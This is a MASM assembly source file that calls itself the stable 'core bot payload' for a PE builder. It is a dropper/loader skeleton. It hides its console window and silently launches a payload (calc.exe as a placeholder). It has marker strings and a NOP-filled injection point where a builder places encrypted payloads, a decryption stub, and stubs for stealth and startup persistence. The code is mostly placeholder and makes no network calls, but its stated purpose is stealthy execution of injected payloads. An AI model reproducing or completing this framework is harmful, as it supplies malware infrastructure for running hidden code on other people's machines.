; ===============================================================================
; CORE MASM BOT - STABLE PAYLOAD (NEVER CHANGES)
; This is the heart of the operation - stable, tested, reliable
; ===============================================================================

.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\shell32.inc
include \masm32\include\advapi32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\advapi32.lib

; ===============================================================================
; CORE DATA SECTION
; ===============================================================================
.data
    ; Core payload identifier (used by PE builder to locate injection point)
    payload_marker_start    db "PAYLOAD_START_MARKER_DEADBEEF", 0
    
    ; Default payload (calc.exe launcher)
    default_payload         db "calc.exe", 0
    
    ; Core functionality flags
    stealth_mode           dd 1    ; Enable stealth operations
    persistence_mode       dd 1    ; Enable persistence
    payload_encrypted      dd 0    ; Set by PE builder if payload is encrypted
    
    ; Payload marker end
    payload_marker_end     db "PAYLOAD_END_MARKER_CAFEBABE", 0

; ===============================================================================
; CORE CODE SECTION
; ===============================================================================
.code

; ===============================================================================
; MAIN ENTRY POINT
; ===============================================================================
start:
    ; Core initialization
    call core_init
    
    ; Check if we're running in stealth mode
    cmp stealth_mode, 1
    je stealth_execution
    
    ; Normal execution path
    call normal_execution
    jmp exit_cleanly
    
stealth_execution:
    ; Stealth execution path
    call stealth_init
    call execute_payload_stealthily
    call cleanup_stealth
    jmp exit_cleanly

exit_cleanly:
    ; Clean exit
    push 0
    call ExitProcess

; ===============================================================================
; CORE INITIALIZATION
; ===============================================================================
core_init proc
    ; Basic initialization that always happens
    
    ; Check if payload is encrypted (PE builder sets this flag)
    cmp payload_encrypted, 1
    je decrypt_payload
    
    ; Payload is not encrypted, continue normally
    jmp init_complete
    
decrypt_payload:
    ; Call decryption routine (implemented by PE builder)
    call decrypt_embedded_payload
    
init_complete:
    ret
core_init endp

; ===============================================================================
; STEALTH INITIALIZATION
; ===============================================================================
stealth_init proc
    ; Minimal stealth setup
    
    ; Hide console window if we have one
    call GetConsoleWindow
    test eax, eax
    jz no_console
    
    push 0                          ; SW_HIDE
    push eax                        ; console window handle
    call ShowWindow
    
no_console:
    ret
stealth_init endp

; ===============================================================================
; NORMAL EXECUTION
; ===============================================================================
normal_execution proc
    ; Execute payload normally (visible)
    
    push 1                          ; SW_SHOWNORMAL
    push 0                          ; lpDirectory
    push 0                          ; lpParameters  
    push offset default_payload     ; lpFile
    push 0                          ; lpOperation
    push 0                          ; hwnd
    call ShellExecuteA
    
    ret
normal_execution endp

; ===============================================================================
; STEALTH EXECUTION
; ===============================================================================
execute_payload_stealthily proc
    ; Execute payload in stealth mode
    
    push 0                          ; SW_HIDE
    push 0                          ; lpDirectory
    push 0                          ; lpParameters
    push offset default_payload     ; lpFile
    push 0                          ; lpOperation  
    push 0                          ; hwnd
    call ShellExecuteA
    
    ret
execute_payload_stealthily endp

; ===============================================================================
; STEALTH CLEANUP
; ===============================================================================
cleanup_stealth proc
    ; Clean up any stealth artifacts
    
    ; Wait a bit before exiting
    push 2000                       ; 2 seconds
    call Sleep
    
    ret
cleanup_stealth endp

; ===============================================================================
; DECRYPTION STUB (IMPLEMENTED BY PE BUILDER)
; ===============================================================================
decrypt_embedded_payload proc
    ; This is a stub - the PE builder will implement the actual decryption
    ; based on which encryption layers were applied
    
    ; For now, just return (no decryption needed)
    ret
decrypt_embedded_payload endp

; ===============================================================================
; PAYLOAD INJECTION POINT MARKERS
; ===============================================================================
; These markers help the PE builder locate where to inject encrypted payloads

injection_point_start:
    db "INJECTION_POINT_START_12345678", 0
    db 1000 dup(90h)                ; 1KB of NOPs for payload injection
injection_point_end:
    db "INJECTION_POINT_END_87654321", 0

; ===============================================================================
; PERSISTENCE ROUTINES (OPTIONAL)
; ===============================================================================
install_persistence proc
    ; Minimal persistence installation
    ; Only called if persistence_mode = 1
    
    cmp persistence_mode, 1
    jne no_persistence
    
    ; Add to startup (basic method)
    ; The PE builder can enhance this with more advanced techniques
    
no_persistence:
    ret
install_persistence endp

end start